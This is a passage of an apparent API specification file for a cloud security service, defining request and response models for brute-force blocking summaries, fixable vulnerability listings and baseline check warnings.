  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='263'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeBruteForceRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceRecordsResponseBody(name='body'),
}

async function describeBruteForceRecords(request: DescribeBruteForceRecordsRequest): DescribeBruteForceRecordsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBruteForceRecords', 'POST', '/', 'json', false, 'json', request);
}

model DescribeBruteForceSummaryRequest {
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='203.119.XX.XX', position='Query'),
}

model DescribeBruteForceSummaryResponseBody = {
  bruteForceSummary?: {
    allStrategyCount?: int32(name='AllStrategyCount', description='The number of anti-brute force IP blocking policies.', example='13'),
    antiBruteForceRuleCount?: string(name='AntiBruteForceRuleCount', description='The number of defense policies.', example='2'),
    customEffectiveCount?: string(name='CustomEffectiveCount', description='The number of custom blocking rules that are in effect.', example='3'),
    customRecordCount?: string(name='CustomRecordCount', description='The number of custom blocking rules.', example='19730'),
    effectiveCount?: int32(name='EffectiveCount', description='The number of anti-brute force IP blocking policies enabled.', example='2'),
    systemEffectiveCount?: string(name='SystemEffectiveCount', description='The number of system blocking rules that are in effect.', example='1'),
    systemRecordCount?: string(name='SystemRecordCount', description='The number of system blocking rules.', example='2'),
  }(name='BruteForceSummary', description='The statistics of IP address blocking policies.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='AE60EAE3-ABD0-897C-B0F16CAC6C7D'),
}

model DescribeBruteForceSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceSummaryResponseBody(name='body'),
}

async function describeBruteForceSummary(request: DescribeBruteForceSummaryRequest): DescribeBruteForceSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeBruteForceSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCanFixVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability that is specified in Common Vulnerabilities and Exposures (CVE).', example='RHSA-2017:0184-Important: mysql security update', position='Query'),
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c80f79959fd724a888e1187779b13****', position='Query'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas-test-cnnf', position='Query'),
  containerId?: string(name='ContainerId', description='The container ID.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d5a****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number. Pages start from page 1. Default value: 1.', example='1', position='Query'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: The vulnerability is handled. **n**: The vulnerability is not handled.', example='n', position='Query'),
  digest?: string(name='Digest', description='The unique identifier of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****', position='Query'),
  image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****', position='Query'),
  instanceId?: string(name='InstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~451339~~) operation of Container Registry and obtain the ID of the container image from **InstanceId** in the response.', example='cri-rv4nvbv8iju4****', position='Query'),
  name?: string(name='Name', description='The name of the vulnerability.', example='scan:AVD-2022-953356', position='Query'),
  namespace?: string(name='Namespace', description='The namespace of the cluster.

>  You can call the [GetOpaClusterNamespaceList](~~GetOpaClusterNamespaceList~~) operation to query the namespaces of clusters.', example='default', position='Query'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.', example='20', position='Query'),
  pod?: string(name='Pod', description='The name of the container group.', example='22222-7xsqq', position='Query'),
  regionId?: string(name='RegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-hangzhou', position='Query'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~145293~~) operation of Container Registry and obtain the ID of the image repository from **RepoId** in the response.', example='crr-avo7qp02simz2njo', position='Query'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~451339~~) operation of Container Registry and obtain the ID of the container image from **InstanceId** in the response.', example='cri-rv4nvbv8iju4****', position='Query'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='digital-account', position='Query'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='ns-digital-dev', position='Query'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-hangzhou', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**', position='Query'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **4**: The vulnerability is being fixed.
*   **7**:The vulnerability is fixed.', example='1', position='Query'),
  tag?: string(name='Tag', description='The tag to add to the image.', example='0.1.0', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='cve', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the image. Separate multiple UUIDs with commas (,).', example='d15df12472809c1c3b158606c0f1****', position='Query'),
}

model DescribeCanFixVulListResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1408FDB3-46F4-513C-9918-FE7D356DF048'),
  vulRecords?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25010:libwebp up to 1.0.0 ApplyFilter out-of-bounds read'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      canUpdate?: boolean(name='CanUpdate', description='Indicates whether the packages of the software that has the vulnerability can be upgraded by using Security Center. Valid values:

*   **true**
*   **false**', example='true'),
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The container ID.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      extendContentJson?: {
        os?: string(name='Os', description='The name of the operating system.', example='debian'),
        osRelease?: string(name='OsRelease', description='The version of the operating system in the image.', example='10.9'),
        rpmEntityList?: [ 
          {
            fullVersion?: string(name='FullVersion', description='The complete version number of the software package.', example='3.10.0-693.2.2.el7'),
            layer?: string(name='Layer', description='The SHA-256 value of the digest of the image layer.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1****'),
            matchDetail?: string(name='MatchDetail', description='The information about the detected vulnerability.', example='python-perf version less than 0:3.10.0-693.21.1.el7'),
            matchList?: [ string ](name='MatchList', description='The rule that is used to detect the vulnerability.'),
            name?: string(name='Name', description='The name of the software package.', example='python-perf'),
            path?: string(name='Path', description='The path of the software that has the vulnerability.', example='/usr/lib64/python2.7/site-packages'),
            updateCmd?: string(name='UpdateCmd', description='The command that is used to fix the vulnerability.', example='apt-get update && apt-get install libseccomp2  --only-upgrade'),
            version?: string(name='Version', description='The version number of the software package.', example='3.10.0'),
          }
        ](name='RpmEntityList', description='The RPM packages.'),
      }(name='ExtendContentJson', description='The extended information about the vulnerability.'),
      firstTs?: long(name='FirstTs', description='The timestamp generated when the vulnerability was first detected. Unit: milliseconds.', example='1620752053000'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageDigest?: string(name='ImageDigest', description='The unique identifier of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      instanceName?: string(name='InstanceName', description='The name of the instance.

The name must be 3 to 64 characters in length and can contain letters, digits, hyphens (-), and underscores (\\_).', example='testInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='172.19.XX.XX'),
      lastTs?: long(name='LastTs', description='The timestamp generated when the vulnerability was last detected. Unit: milliseconds.', example='1620404763000'),
      layers?: [ string ](name='Layers', description='The image layers.'),
      maliciousSource?: string(name='MaliciousSource', description='The source of the malicious file. Valid values:

*   **agentless**
*   **image**
*   **container**', example='agentless'),
      modifyTs?: long(name='ModifyTs', description='The timestamp generated when the vulnerability status was modified. Unit: milliseconds.', example='1620404763000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix high-level vulnerabilities as soon as possible.', example='asap,later,nntf'),
      pod?: string(name='Pod', description='The name of the container group.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The vulnerability ID.', example='782661'),
      related?: string(name='Related', description='The CVE IDs related to the vulnerability. Multiple CVE IDs are separated by commas (,).', example='CVE-2017-7518,CVE-2017-12188'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='3rdparty'),
      scanTime?: long(name='ScanTime', description='The timestamp generated when the scan task was performed. Unit: milliseconds.', example='1649814050000'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: The vulnerability is unfixed.
*   **4**: The vulnerability is being fixed.
*   **7**: The vulnerability is fixed.', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='latest'),
      targetId?: string(name='TargetId', description='The ID of the asset that is scanned.', example='300269'),
      targetName?: string(name='TargetName', description='The name of the asset that is scanned.', example='source-test-obj-XM0Ma'),
      targetType?: string(name='TargetType', description='The type of the asset that is scanned. Valid values:

*   **IMAGE**
*   **ECS_IMAGE**
*   **ECS_SNAPSHOT**', example='ECS_IMAGE'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: system vulnerability
*   **sca**: application vulnerability', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the container image.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='The information about the vulnerability.'),
}

model DescribeCanFixVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCanFixVulListResponseBody(name='body'),
}

async function describeCanFixVulList(request: DescribeCanFixVulListRequest): DescribeCanFixVulListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCanFixVulList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckEcsWarningsRequest {
  sourceIp?: string(name='SourceIp', example='1.2.3.4', position='Query'),
}

model DescribeCheckEcsWarningsResponseBody = {
  canTry?: string(name='CanTry', example='0'),
  requestId?: string(name='RequestId', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  sasVersion?: string(name='SasVersion', example='3'),
  weakPasswordCount?: string(name='WeakPasswordCount', example='3'),
}

model DescribeCheckEcsWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckEcsWarningsResponseBody(name='body'),
}

async function describeCheckEcsWarnings(request: DescribeCheckEcsWarningsRequest): DescribeCheckEcsWarningsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckEcsWarnings', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckFixDetailsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the risk item.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the IDs of risk items.', example='58', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of baselines.', example='51', position='Query'),
}

model DescribeCheckFixDetailsResponseBody = {
  checkFixDetails?: [ 
    {
      checkDesc?: string(name='CheckDesc', description='The detailed description of the risk item.', example='Force users not to reuse recently used passwords to reduce the risk of password guessing attacks'),
      checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
      checkItem?: string(name='CheckItem', description='The description of the risk item.', example='Ensure password reuse is limited'),
      rules?: [ 
        {
          checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
          defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='1'),
          optional?: int32(name='Optional', description='Indicates whether the rule is optional. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
          paramList?: [ 
            {
              enumValue?: string(name='EnumValue', description='The options that can be selected for the rule parameter if the value of the ParamType parameter is 2.', example='0,1,2,3'),
              maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='24'),
              minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='5'),
              paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='5'),
              paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
              paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
              paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
              ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
              value?: string(name='Value', description='The specified value of the rule parameter.', example='18'),
            }
          ](name='ParamList', description='An array that consists of the rule parameters.'),
          ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='(/etc/system-auth)Force users not to reuse the number of recently used passwords between 5 and 24'),
          ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
          value?: int32(name='Value', description='The specified value of the rule parameter.', example='5'),
          varName?: string(name='VarName', description='The name of the variable.', example='open'),
        }
      ](name='Rules', description='An array consisting of the rules that are supported by the risk item.'),
    }
  ](name='CheckFixDetails', description='An array that consists of the parameters.'),
  count?: int32(name='Count', description='The number of risk items that can be fixed.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DBF1E27-98D8-5EC2-9CF3-4A2E26F6****'),
}

model DescribeCheckFixDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckFixDetailsResponseBody(name='body'),
}

async function describeCheckFixDetails(request: DescribeCheckFixDetailsRequest): DescribeCheckFixDetailsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckFixDetails', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckWarningDetailRequest {
  checkWarningId: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.

>  To query the details about a specified check item, you must provide the ID of the alert that is triggered by the check item. You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of alerts.', example='98675301', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='103.25.XX.XX', position='Query'),
}

model DescribeCheckWarningDetailResponseBody = {
  advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='You can fix it in the following ways:↵1. To configure authentication for redis service, click the redis.conf Configure complex password in requirepass, and then restart redis.↵2. In redis configuration file redis.conf The configuration is as follows: bind 127.0.0.1, only allow local access, and then restart redis'),
  checkDetailAssetInfo?: [ map[string]string ](name='CheckDetailAssetInfo', description='List of asset details to check.'),
  checkDetailColumns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', description='Key to detect content.', example='Username'),
          showName?: string(name='ShowName', description='The detection content key corresponds to the display name.', example='UserName'),
          type?: string(name='Type', description='Display type. Value:
- **grid**：Detection grid
- **text**：text', example='text'),
        }
      ](name='Grids', description='Detection content list.'),
      key?: string(name='Key', description='Key to detect content.', example='Containername'),
      showName?: string(name='ShowName', description='The detection content key corresponds to the display name.', example='ContainerName'),
      type?: string(name='Type', description='Display type. Value:
- **grid**：Detection grid
- **text**：text', example='text'),
    }
  ](name='CheckDetailColumns', description='Detection content details.'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='946'),
  description?: string(name='Description', description='The additional information about the risk item.', example='The redis port is open to the outside world and there is no authentication option configured. In addition to directly obtaining all the information in the database, unauthorized users can also attack the system through unauthorized access vulnerability.'),
  item?: string(name='Item', description='The name of the check item.', example='Redis unauthorized access'),
  level?: string(name='Level', description='The risk level of the check item. Valid values:

*   **high**: The item is a high-risk item and is highlighted in red.
*   **medium**: The item is a medium-risk item and is highlighted in orange.
*   **low**: The item is a low-risk item and is highlighted in gray.', example='high'),
  prompt?: string(name='Prompt', description='The prompt for the risk item.', example='weak passwords (username@host/password):root@****/12***'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  type?: string(name='Type', description='The type of the check item. Valid values:

*   **hc_exploit**: unauthorized access
*   **hc_djbh**: classified protection compliance
*   **hc_best_secruity**: best security practice
*   **hc_container**: container security
*   **hc_custom**: custom baseline
*   **cis**: Center for Internet Security (CIS) compliance
*   **weak_password**: weak password', example='hc_exploit'),
}

model DescribeCheckWarningDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningDetailResponseBody(name='body'),
}

async function describeCheckWarningDetail(request: DescribeCheckWarningDetailRequest): DescribeCheckWarningDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckWarningDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckWarningMachinesRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of check items.', example='58', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of baselines.', example='43', position='Query'),
  status?: int32(name='Status', description='Specifies whether the check item passed the baseline check. Valid values:
*   **1**: no
*   **3**: yes', example='1', position='Query'),
}

model DescribeCheckWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of the servers on which the same risk item is detected.', example='10'),
  machines?: [ 
    {
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1dp42hgn1xcq8l****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='win-oracl****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='An array consisting of the servers on which the same risk item is detected.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B3D989EB-2E59-584C-8438-5DFAA34A****'),
}

model DescribeCheckWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningMachinesResponseBody(name='body'),
}

async function describeCheckWarningMachines(request: DescribeCheckWarningMachinesRequest): DescribeCheckWarningMachinesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckWarningMachines', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckWarningSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c80dae73bd1be442699766b14ffd0****', position='Query'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster
*   **image**: the name of the image
*   **imageId**: the ID of the image
*   **namespace**: the namespace', example='namespace', position='Query'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='c819391d2d520485fa3e81e2dc2ea****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='123', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
  riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis', position='Query'),
  riskStatus?: int32(name='RiskStatus', description='The status of the baseline check. Valid values:

*   **1**: failed
*   **3**: passed', example='1', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='219.133.XX.XX', position='Query'),
  status?: string(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1', position='Query'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='1', position='Query'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **uuid**: the ID of an asset', example='uuid', position='Query'),
  typeName?: string(name='TypeName', description='The level-1 type of check items.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the level-1 types of check items.', example='database', position='Query'),
  uuids?: string(name='Uuids', description='The UUID of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='f03259d8-1e81-4fae-bcbb-275fb5****', position='Query'),
}

model DescribeCheckWarningSummaryResponseBody = {
  count?: int32(name='Count', description='The number of check items returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the current page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00BD7CE2-284A-4534-BD09-FB69836DD750'),
  totalCount?: int32(name='TotalCount', description='The total number of check items.', example='100'),
  warningSummarys?: [ 
    {
      checkCount?: int32(name='CheckCount', description='The number of check items.', example='10'),
      checkExploit?: boolean(name='CheckExploit', description='Indicates whether the risk item can be exploited. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      containerRisk?: boolean(name='ContainerRisk', description='Indicates  whether the risk item is a container runtime risk item. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      databaseRisk?: boolean(name='DatabaseRisk', description='Indicates whether the risk item is a database risk item. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='1'),
      lastFoundTime?: string(name='LastFoundTime', description='The time when the last baseline check was performed.', example='2019-01-01 12:23:00'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='2'),
      riskId?: long(name='RiskId', description='The ID of the risk item.', example='118'),
      riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis'),
      subTypeAlias?: string(name='SubTypeAlias', description='The level-2 type of the risk item.', example='Redis'),
      typeAlias?: string(name='TypeAlias', description='The level-1 type of the check item. Examples: database, system, weak password, and middleware.', example='databases'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The number of assets on which risk items are detected.', example='11'),
    }
  ](name='WarningSummarys', description='The statistics of check items.'),
}

model DescribeCheckWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningSummaryResponseBody(name='body'),
}

async function describeCheckWarningSummary(request: DescribeCheckWarningSummaryRequest): DescribeCheckWarningSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckWarningSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCheckWarningsRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='2546', position='Query'),
  checkType?: string(name='CheckType', description='The type of the check item. Valid values:

*   **hc.check.type.identity_auth**: identity authentication
*   **hc.check.type.access_control**: access control
*   **hc.check.type.network_service**: network and service
*   **hc.check.type.service_conf**: service configuration
*   **hc.check.type.file_rights**: file permission
*   **hc.check.type.security_audit**: security audit
*   **hc.check.type.attack_defense**: intrusion prevention
*   **hc.check.type.others**: others', example='hc.check.type.attack_defense', position='Query'),
  containerName?: string(name='ContainerName', description='The name of the container.', example='/redis', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  riskId?: long(name='RiskId', description='The ID of the risk item.

>  To query the information about the risk items and check items of a server, you must provide the IDs of risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs.', example='10354', position='Query'),
  riskStatus?: int32(name='RiskStatus', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.

> To query specified risk items and the check items of a specified server, you must provide the ID of the server on which the baseline check is performed. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the IDs of servers.', example='d42f938c-d962-48a0-90f9-05****', position='Query'),
}

model DescribeCheckWarningsResponseBody = {
  checkWarnings?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
      checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.', example='212251441'),
      execErrorMessage?: string(name='ExecErrorMessage', description='The error message in the check result.', example='ScriptKilledOfCpuHigh'),
      fixStatus?: int32(name='FixStatus', description='Indicates whether the fix is supported. Valid values:

*   **0**: The fix is not supported.
*   **1**: The fix is supported.', example='0'),
      item?: string(name='Item', description='The name of the check item.', example='passwordExpire'),
      level?: string(name='Level', description='The severity level of a risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      reason?: string(name='Reason', description='The remarks.', example='ignore'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
      type?: string(name='Type', description='The type of the check item.', example='hc.check.type.identity_auth'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='d42f938c-d962-48a0-90f9-****'),
    }
  ](name='CheckWarnings', description='The information about the check item.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
